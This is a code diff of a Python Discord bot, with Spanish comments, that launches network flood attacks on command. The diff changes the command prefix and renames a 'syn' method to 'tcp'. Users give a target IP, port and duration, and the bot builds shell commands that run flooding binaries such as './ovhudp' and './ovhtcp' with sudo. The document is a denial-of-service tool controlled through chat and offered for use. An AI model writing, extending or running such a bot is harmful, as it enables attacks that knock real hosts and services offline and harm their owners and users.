@@ -40,7 +40,7 @@ else:
 print("="*60 + "\n")
 
 # Prefijo del bot y configuración de intents
-BOT_PREFIX = '!'
+BOT_PREFIX = '.'
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents)
@@ -126,9 +126,9 @@ async def ovhudp_command(ctx, ip: str = None, port: str = None, tiempo: str = No
 async def ovhtcp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
     await realizar_ataque(ctx, 'ovhtcp', ip, port, tiempo)
 
-@bot.command(name='syn')
+@bot.command(name='tcp')
 async def syn_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
-    await realizar_ataque(ctx, 'syn', ip, port, tiempo)
+    await realizar_ataque(ctx, 'tcp', ip, port, tiempo)
 
 async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
     global ataque_en_curso, proceso_en_curso
@@ -172,8 +172,8 @@ async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
         comando = f'sudo ./ovhudp {ip} {port_int} 40 -1 {tiempo_int}'
     elif metodo == 'ovhtcp':
         comando = f'sudo ./ovhtcp {ip} {port_int} 40 -1 {tiempo_int}'
-    elif metodo == 'syn':
-        comando = f'./tcp-syn {ip} {port_int} {tiempo_int}'  # Asumiendo que tcp-syn es el script para SYN
+    elif metodo == 'tcp':
+        comando = f'./tcp {ip} {port_int} {tiempo_int}'  # Asumiendo que tcp-syn es el script para SYN
     else:
         return # No enviar mensaje de error
 
